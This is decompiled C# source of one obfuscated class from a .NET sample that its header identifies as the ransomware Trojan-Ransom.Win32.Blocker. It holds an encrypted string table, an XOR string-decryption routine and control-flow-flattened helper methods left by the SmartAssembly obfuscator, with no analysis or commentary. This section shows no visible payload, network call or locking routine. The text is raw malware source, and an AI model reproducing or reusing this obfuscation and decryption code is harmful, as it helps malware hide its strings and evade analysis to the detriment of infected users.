// Decompiled with JetBrains decompiler
// Type: Ⴈ.ႳႷ
// Assembly: o4tdggb3, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA0844EB-EF82-404C-B76C-C092ABDB9392
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.bzqq-b74e3dc76fae79b75c26f27ecb85aae1eae4082a42bfa080f7805f32dedc9d67.exe

using SmartAssembly.Attributes;
using SmartAssembly.SmartExceptionsCore;
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Xml;

namespace Ⴈ
{
  internal sealed class ႳႷ : IDisposable
  {
    private PoweredByAttribute1.Ⴗ Ⴗ;
    private static readonly char[] Ⴄ;
    private static readonly char[] Ⴈ;
    private static readonly string[] Ⴃ;
    internal static ႳႷ.Ⴓ Ⴐ;

    public ႳႷ(XmlWriter Ⴄ, string Ⴓ)
    {
      XmlWriter xmlWriter;
      try
      {
        try
        {
          xmlWriter = Ⴄ;
          this.Ⴗ.Ⴅ = xmlWriter;
          ႷႨ.Ⴈ(this.Ⴗ.Ⴅ, Ⴓ, 290, 299);
        }
        catch (Exception ex)
        {
          XmlWriter o2 = Ⴄ;
          string o3 = Ⴓ;
          StackFrameHelper.CreateException3(ex, (object) this, (object) o2, (object) o3);
          throw;
        }
      }
      catch (Exception ex)
      {
        XmlWriter o1 = xmlWriter;
        XmlWriter o3 = Ⴄ;
        string o4 = Ⴓ;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) this, (object) o3, (object) o4);
        throw;
      }
    }

    public void Dispose()
    {
      try
      {
        try
        {
          StackFrameHelper.Ⴅ(this.Ⴗ.Ⴅ, 316, 382);
        }
        catch (Exception ex)
        {
          StackFrameHelper.CreateException1(ex, (object) this);
          throw;
        }
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException1(ex, (object) this);
        throw;
      }
    }

    static ႳႷ()
    {
      int num;
      char[] chArray;
      try
      {
        num = 2;
        while (true)
        {
          switch (num)
          {
            case 0:
              goto label_8;
            case 1:
              chArray[2] = 'ዯ';
              chArray[1] = '㳂';
              chArray[5] = 'ԣ';
              num = 7;
              continue;
            case 3:
              chArray[6] = 'ٔ';
              chArray[3] = '㍘';
              chArray[4] = 'ም';
              num = 1;
              continue;
            case 4:
            case 6:
              chArray = new char[8];
              num = 3;
              continue;
            case 5:
              chArray[0] = 'ሀ';
              ႳႷ.Ⴃ = new string[53];
              num = 0;
              continue;
            case 7:
              chArray[7] = 'ᓘ';
              goto case 5;
            default:
              SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
              ႳႷ.Ⴈ = new char[838]
              {
                char.MinValue,
                '\a',
                char.MinValue,
                'ታ',
                '㲧',
                'ኝ',
                '㌮',
                'ቸ',
                'Ց',
                '٥',
                '\u0001',
                '\u0002',
                char.MinValue,
                '㳪',
                'ክ',
                '\u0002',
                '\n',
                char.MinValue,
                'ኘ',
                '㌄',
                'ሢ',
                'Ո',
                '\u0604',
                'ᓪ',
                'ቖ',
                '㳤',
                'ኳ',
                '㌡',
                '\u0003',
                '\n',
                char.MinValue,
                '㌅',
                'ሣ',
                'ո',
                '؉',
                'ᒝ',
                'ቑ',
                '㲖',
                'ዀ',
                '㌋',
                'ቲ',
                '\u0004',
                '\u0013',
                char.MinValue,
                'ሯ',
                'ԓ',
                '٥',
                'ᓫ',
                'ር',
                '㳲',
                '\u12D7',
                '㍵',
                'ሬ',
                'Ԗ',
                '\u0600',
                'ᓨ',
                'ስ',
                '㳸',
                'ዛ',
                '㍮',
                'ሧ',
                'Ԗ',
                '٠',
                '\u0005',
                '\r',
                char.MinValue,
                'հ',
                'ع',
                'ᒹ',
                'ቲ',
                '㲶',
                'ኮ',
                '㌫',
                'ቮ',
                'Ն',
                'ع',
                'ᒺ',
                'ቬ',
                '㲻',
                '\u0006',
                ' ',
                char.MinValue,
                'ؗ',
                'ᒷ',
                'ቮ',
                '㲤',
                'ኆ',
                '㌪',
                'ተ',
                'ե',
                'ر',
                'ᒹ',
                'ቴ',
                '㲷',
                'ኝ',
                '㌽',
                'ቈ',
                'Ր',
                'ص',
                'ᒿ',
                'ብ',
                '㲐',
                'ኊ',
                '㌨',
                'ቲ',
                'Ց',
                'ؠ',
                'ᒱ',
                'ቮ',
                '㲥',
                'ኩ',
                '㌷',
                'ቯ',
                'Վ',
                '\a',
                '\u0005',
                char.MinValue,
                'ᒛ',
                'ቬ',
                '㲧',
                '\u128E',
                '㌪',
                '\b',
                '\n',
                char.MinValue,
                'ቅ',
                '㲐',
                'ኽ',
                '㍸',
                'ሯ',
                'ԓ',
                '٤',
                'ᓫ',
                'ሺ',
                '㳢',
                '\t',
                '\u0002',
                char.MinValue,
                '㲍',
                'ኤ',
                '\n',
                ',',
                char.MinValue,
                'ኼ',
                '㌡',
                'ቮ',
                '\u0557',
                'ر',
                'ᒵ',
                'ሮ',
                '㲑',
                'ኊ',
                '㌻',
                'ቨ',
                'Ց',
                'ؽ',
                'ᒬ',
                'ቹ',
                '㳬',
                'ኬ',
                '㌪',
                'ቤ',
                'Փ',
                'ؠ',
                'ᒷ',
                'ቧ',
                '㲰',
                '\u128E',
                '㌨',
                'ት',
                '՚',
                'ٺ',
                'ᒊ',
                'ቩ',
                '㲨',
                'ኁ',
                '㌼',
                'ቼ',
                'Ն',
                'ظ',
                'ᒕ',
                'ቡ',
                '㲬',
                '\u128E',
                '㌿',
                'ቸ',
                'Շ',
                '\v',
                '\u0010',
                char.MinValue,
                '㌋',
                'ተ',
                'Ղ',
                'ئ',
                'ᒬ',
                'ቓ',
                '㲶',
                '\u128E',
                '㌻',
                'ቶ',
                'ե',
                'ئ',
                'ᒹ',
                'ቭ',
                '㲧',
                'ኜ',
                '\f',
                '\u0003',
                char.MinValue,
                'ቘ',
                'ձ',
                '؆',
                '\r',
                '\u0001',
                char.MinValue,
                '՛',
                '\u000E',
                '\u0006',
                char.MinValue,
                '؛',
                'ᒺ',
                'ቪ',
                '㲧',
                'ኌ',
                '㌬',
                '\u000F',
                '\u0003',
                char.MinValue,
                'ᓰ',
                'ሰ',
                '㲺',
                '\u0010',
                '\u0001',
                char.MinValue,
                'ሢ',
                '\u0011',
                '\u0005',
                char.MinValue,
                '㲔',
                '\u128E',
                '㌴',
                'ቨ',
                'Ն',
                '\u0012',
                '\u0002',
                char.MinValue,
                'ኦ',
                '㌜',
                '\u0013',
                '\u0001',
                char.MinValue,
                '㍷',
                '\u0014',
                '\u0001',
                char.MinValue,
                'ቮ',
                '\u0015',
                '\u0006',
                char.MinValue,
                'ն',
                'ا',
                'ᒽ',
                'ቲ',
                '㲋',
                'ካ',
                '\u0016',
                '\b',
                char.MinValue,
                '؆',
                'ᒽ',
                'ተ',
                '㲭',
                'ኝ',
                '㌬',
                'ቔ',
                'է',
                '\u0017',
                '\u0004',
                char.MinValue,
                'ᒌ',
                'ቨ',
                '㲫',
                'ኜ',
                '\u0018',
                '\b',
                char.MinValue,
                'ቆ',
                '㲫',
                'ኃ',
                '㌽',
                'ቓ',
                'Ղ',
                'ع',
                'ᒽ',
                '\u0019',
                '\u0011',
                char.MinValue,
                '㲑',
                'ኖ',
                '㌫',
                'ቩ',
                'Ն',
                'ع',
                'ᒑ',
                'ቮ',
                '㲤',
                'ኀ',
                '㌪',
                'ተ',
                'Ղ',
                'ؠ',
                'ᒱ',
                'ቯ',
                '㲬',
                '\u001A',
                '\n',
                char.MinValue,
                'ኡ',
                '㌝',
                '\u1249',
                'յ',
                'ر',
                'ᒪ',
                'ታ',
                '㲫',
                'ኀ',
                '㌶',
                '\u001B',
                '\b',
                char.MinValue,
                '㌋',
                'ቸ',
                'Ց',
                'آ',
                'ᒽ',
                'ቲ',
                '㲐',
                'ዝ',
                '\u001C',
                '\u0001',
                char.MinValue,
                'ር',
                '\u001D',
                '\r',
                char.MinValue,
                'ձ',
                'ر',
                'ᒵ',
                'ቯ',
                '㲴',
                'ኊ',
                '㌼',
                'ቛ',
                'Ց',
                'ص',
                'ᒵ',
                'ብ',
                '㲱',
                '\u001E',
                '\u0010',
                char.MinValue,
                '\u0600',
                'ᒷ',
                'ቴ',
                '㲣',
                'ኃ',
                '㌞',
                'ቯ',
                'Ղ',
                'ع',
                'ᒽ',
                'ታ',
                '㲁',
                'ኀ',
                '㌭',
                'ታ',
                '\u0557',
                '\u001F',
                '\b',
                char.MinValue,
                'ᒑ',
                'ቌ',
                '㲍',
                '\u1289',
                '㌾',
                'ቮ',
                'Ն',
                'ؠ',
                ' ',
                '\t',
                char.MinValue,
                'ቔ',
                '㲻',
                'ኟ',
                '㌽',
                'ቓ',
                'Ղ',
                'ع',
                'ᒽ',
                'ታ',
                '!',
                '\u0005',
                char.MinValue,
                '㲁',
                'ኀ',
                '㌭',
                'ታ',
                '\u0557',
                '"',
                '\u0018',
                char.MinValue,
                'ኪ',
                '㌊',
                '\u124F',
                'ԃ',
                '٦',
                'ᓨ',
                'ሰ',
                '㳴',
                'ዕ',
                '㍸',
                'ቦ',
                'ԓ',
                'ة',
                'ᓸ',
                'ቀ',
                '㳢',
                'ዟ',
                '㌠',
                'ቦ',
                'Ԓ',
                'ٮ',
                'ᒠ',
                'ሴ',
                '㲿',
                '#',
                '#',
                char.MinValue,
                '㌮',
                'ር',
                'ԍ',
                '٤',
                'ᓶ',
                'ሰ',
                '㳬',
                'ዟ',
                '㍸',
                'ቻ',
                'Ց',
                'ػ',
                'ᒵ',
                'ሠ',
                '㳲',
                '\u12D7',
                '㍷',
                'ር',
                'ԛ',
                'ٻ',
                'ᓪ',
                'ሰ',
                '㳳',
                'ዜ',
                '㍸',
                'ር',
                'Ԗ',
                'ٮ',
                'ᓬ',
                'ሶ',
                '㳸',
                'ዚ',
                '㍬',
                'ሽ',
                '̖',
                '$',
                '\n',
                char.MinValue,
                'ቍ',
                'Ռ',
                'أ',
                'ᒽ',
                'ቲ',
                '㲧',
                'ኋ',
                '㍸',
                'ቿ',
                '՚',
                '%',
                '\a',
                char.MinValue,
                'Ս',
                'ر',
                'ᒬ',
                'ቷ',
                '㲭',
                'ኝ',
                '㌳',
                '&',
                '\u0012',
                char.MinValue,
                '\u0601',
                'ᒶ',
                'ቨ',
                '㲣',
                'ኁ',
                '㌼',
                'ቱ',
                'Ն',
                'ذ',
                'ᒝ',
                'ቸ',
                '㲡',
                'ኊ',
                '㌨',
                'ቩ',
                'Պ',
                'ػ',
                'ᒶ',
                '\'',
                '!',
                char.MinValue,
                'ᒋ',
                'ቭ',
                '㲣',
                'ኝ',
                '㌬',
                'ቜ',
                'Ր',
                'ا',
                'ᒽ',
                'ቭ',
                '㲠',
                'ኃ',
                '㌡',
                'ሳ',
                'հ',
                'ع',
                'ᒹ',
                'ቲ',
                '㲶',
                'ኪ',
                '㌠',
                'ቾ',
                'Ն',
                'ؤ',
                'ᒬ',
                'ቩ',
                '㲭',
                'ኁ',
                '㌫',
                '\u125E',
                'Ռ',
                'ئ',
                'ᒽ',
                '(',
                '\u0002',
                char.MinValue,
                'ር',
                '㳳',
                ')',
                '\f',
                char.MinValue,
                '㲅',
                'ኊ',
                '㌬',
                '\u124E',
                'Ն',
                'ئ',
                'ᒮ',
                'ብ',
                '㲰',
                'ኺ',
                '㌊',
                'ቑ',
                '*',
                '\u000E',
                char.MinValue,
                'ኽ',
                '㌽',
                'ቭ',
                'Ռ',
                'ئ',
                'ᒬ',
                'ቩ',
                '㲬',
                'ኈ',
                '㍶',
                'ቼ',
                'Ր',
                'ع',
                'ᒠ',
                '+',
                '\r',
                char.MinValue,
                '㌍',
                'ቭ',
                'Տ',
                'ػ',
                'ᒹ',
                'ቤ',
                '㲐',
                'ኊ',
                '㌨',
                'ቲ',
                'Ց',
                'ؠ',
                'ᓪ',
                ',',
                '\n',
                char.MinValue,
                'ቘ',
                'ձ',
                '؆',
                'ᓸ',
                'ሲ',
                '㳲',
                'ዟ',
                '㍩',
                'ሧ',
                'ԃ',
                '-',
                '\u0006',
                char.MinValue,
                'է',
                'ر',
                'ᓾ',
                'ቢ',
                '㲷',
                'ኈ',
                '.',
                'B',
                char.MinValue,
                'د',
                'ᓨ',
                'ች',
                '㳢',
                'ኇ',
                '㌹',
                'ቮ',
                'ԃ',
                'ر',
                'ᒶ',
                'ባ',
                '㲭',
                'ኚ',
                '㌶',
                'ቩ',
                'Ն',
                'ئ',
                'ᒽ',
                'ቤ',
                '㳢',
                '\u128E',
                '㍸',
                'ቭ',
                'Ց',
                'ػ',
                'ᒺ',
                'ቬ',
                '㲧',
                'ኂ',
                '㍶',
                'ሗ',
                'մ',
                'ر',
                'ᓸ',
                'ቡ',
                '㲰',
                'ኊ',
                '㍸',
                'ቮ',
                'Ռ',
                'ئ',
                'ᒪ',
                'ቹ',
                '㳢',
                '\u1289',
                '㌷',
                'ቯ',
                'ԃ',
                'ؠ',
                'ᒰ',
                'ብ',
                '㳢',
                'ኆ',
                '㌶',
                'ቾ',
                'Ռ',
                'غ',
                'ᒮ',
                'ብ',
                '㲬',
                'ኆ',
                '㌽',
                'ታ',
                'Հ',
                'ر',
                'ᓶ',
                '/',
                'I',
                char.MinValue,
                'ᒣ',
                'ሰ',
                '㲿',
                'ዏ',
                '㌹',
                'ቩ',
                '\u0557',
                'ر',
                'ᒵ',
                'ተ',
                '㲶',
                'ኊ',
                '㌼',
                'ሽ',
                '\u0557',
                'ػ',
                'ᓸ',
                'ተ',
                '㲧',
                'ኝ',
                '㌾',
                'ቲ',
                'Ց',
                'ع',
                'ᓸ',
                'ቡ',
                '㲬',
                'ዏ',
                '㌷',
                'ቭ',
                'Ն',
                'ئ',
                'ᒹ',
                'ቴ',
                '㲫',
                'ኀ',
                '㌶',
                'ሽ',
                'Ս',
                'ػ',
                'ᒬ',
                'ሠ',
                '㲣',
                'ኃ',
                '㌴',
                'ቲ',
                'Ք',
                'ر',
                'ᒼ',
                'ሠ',
                '㲠',
                'ኖ',
                '㍸',
                'ቩ',
                'Ջ',
                'ر',
                'ᓸ',
                'ታ',
                '㲧',
                'ኌ',
                '㌭',
                'ቯ',
                'Պ',
                'ؠ',
                'ᒡ',
                'ሠ',
                '㲲',
                'ኀ',
                '㌴',
                'ቴ',
                'Հ',
                'ح',
                'ᓶ',
                '0',
                '\u000E',
                char.MinValue,
                'ቓ',
                '㲧',
                'ኌ',
                '㌭',
                'ቯ',
                'Պ',
                'ؠ',
                'ᒡ',
                'ሠ',
                '㲧',
                'ኝ',
                '㌪',
                'ቲ',
                'Ց',
                '1',
                '\a',
                char.MinValue,
                '㲦',
                'ኊ',
                '㌾',
                'ቼ',
                'Ֆ',
                'ظ',
                'ᒬ',
                '2',
                '\u0017',
                char.MinValue,
                '\u12BF',
                '㌴',
                'ቼ',
                '\u0557',
                'ز',
                'ᒷ',
                'ቲ',
                '㲯',
                'ዏ',
                '㌛',
                'ቨ',
                'Տ',
                'ؠ',
                'ᒭ',
                'ቲ',
                '㲧',
                'ዏ',
                '㌖',
                'ቼ',
                'Վ',
                'ر',
                'ᓢ',
                'ሠ',
                '3',
                '\u0005',
                char.MinValue,
                '㌽',
                'ታ',
                'Ԏ',
                '\u0601',
                'ᒋ',
                '4',
                '\u0001',
                char.MinValue,
                'ቱ'
              };
              goto case 4;
          }
        }
label_8:
        ႳႷ.Ⴄ = chArray;
      }
      catch (Exception ex)
      {
        char[] o1 = chArray;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num;
        StackFrameHelper.CreateException2(ex, (object) o1, (object) o2);
        throw;
      }
    }

    internal static string Ⴗ([In] int obj0, [In] int obj1)
    {
      int num;
      int index1;
      char[] ⴈ;
      int index2;
      string str;
      int length1;
      char[] chArray;
      char[] ⴄ;
      int length2;
      int index3;
      try
      {
label_3:
        index1 = obj0 ^ 2059790400 ^ obj1;
label_4:
        ⴈ = ႳႷ.Ⴈ;
        index2 = (int) ⴈ[index1];
        num = 8;
        while (true)
        {
          switch (num)
          {
            case 1:
              chArray = new char[length1];
              ⴄ = ႳႷ.Ⴄ;
              length2 = ⴄ.Length;
              goto case 5;
            case 2:
              num = index3 < length1 ? 11 : 9;
              continue;
            case 3:
              length1 = (int) ⴈ[index1 + 1];
              length1 = ((int) ⴈ[index1 + 2] << 16) + length1;
              num = 1;
              continue;
            case 4:
              index3 = 0;
              num = 2;
              continue;
            case 5:
              index1 += 3;
              num = 4;
              continue;
            case 6:
              goto label_3;
            case 7:
              goto label_6;
            case 8:
              num = (str = ႳႷ.Ⴃ[index2]) == null ? 3 : 7;
              continue;
            case 9:
              goto label_14;
            case 10:
              index3 = 1 + index3;
              num = 2;
              continue;
            case 11:
            case 12:
              chArray[index3] = (char) ((uint) ⴈ[index1 + index3] ^ (uint) ⴄ[(index3 + index2) % length2]);
              num = 10;
              continue;
            case 13:
              goto label_4;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႳႷ.Ⴗ);
              num = 6;
              continue;
          }
        }
label_6:
        return str;
label_14:
        str = new string(chArray);
        ႳႷ.Ⴃ[index2] = str;
        return str;
      }
      catch (Exception ex)
      {
        object[] objects = new object[12]
        {
          (object) index1,
          (object) index2,
          (object) length1,
          (object) ⴈ,
          (object) str,
          (object) chArray,
          (object) ⴄ,
          (object) length2,
          (object) index3,
          (object) num,
          (object) obj0,
          (object) obj1
        };
        StackFrameHelper.CreateExceptionN(ex, objects);
        throw;
      }
    }

    internal static void Ⴍ([In] Control obj0, [In] Size obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
        num1 = 0;
        while (true)
        {
          switch (num1)
          {
            case 2:
            case 3:
            case 4:
              goto label_7;
            case 5:
              num1 = 0;
              continue;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 79:
                  num2 = 4;
                  break;
                default:
                  num2 = 5;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_7:
        obj0.MaximumSize = obj1;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num3;
        Control o3 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<Size> o4 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) obj3;
        StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6);
        throw;
      }
    }

    internal static char Ⴀ([In] string obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj3 ^ obj2)
        {
          case 105:
            num2 = 7;
            break;
          default:
            num2 = 2;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 7:
              goto label_8;
            case 1:
              num1 = 6;
              continue;
            case 2:
            case 4:
              num1 = 6;
              continue;
            case 3:
            case 6:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႳႷ.Ⴀ);
              num1 = 6;
              continue;
          }
        }
label_8:
        return obj0[obj1];
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        string o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static string Ⴜ([In] Control obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 31:
            num2 = 4;
            break;
          default:
            num2 = 2;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 1:
            case 3:
            case 4:
              goto label_8;
            case 2:
              num1 = 7;
              continue;
            case 6:
              num1 = 7;
              continue;
            case 7:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႳႷ.Ⴜ);
              num1 = 7;
              continue;
          }
        }
label_8:
        return obj0.Text;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        Control o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static string ႤႷ([In] ref ulong obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj3 ^ obj2)
        {
          case 83:
            num2 = 7;
            break;
          default:
            num2 = 0;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 5:
              num1 = 6;
              continue;
            case 1:
              num1 = 6;
              continue;
            case 4:
            case 7:
              goto label_8;
            case 6:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႳႷ.ႤႷ);
              num1 = 6;
              continue;
          }
        }
label_8:
        return obj0.ToString(obj1);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<ulong> o2 = (ValueType) obj0;
        string o3 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static bool ႤႤ([In] CheckBox obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 64:
            num2 = 4;
            break;
          default:
            num2 = 0;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
              num1 = 1;
              continue;
            case 1:
            case 5:
              goto label_3;
            case 2:
            case 4:
            case 6:
              goto label_8;
            case 3:
              num1 = 1;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႳႷ.ႤႤ);
              num1 = 1;
              continue;
          }
        }
label_8:
        return obj0.Checked;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        CheckBox o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    [StructLayout(LayoutKind.Explicit, Size = 1676, Pack = 1)]
    private struct Ⴓ
    {
    }
  }
}
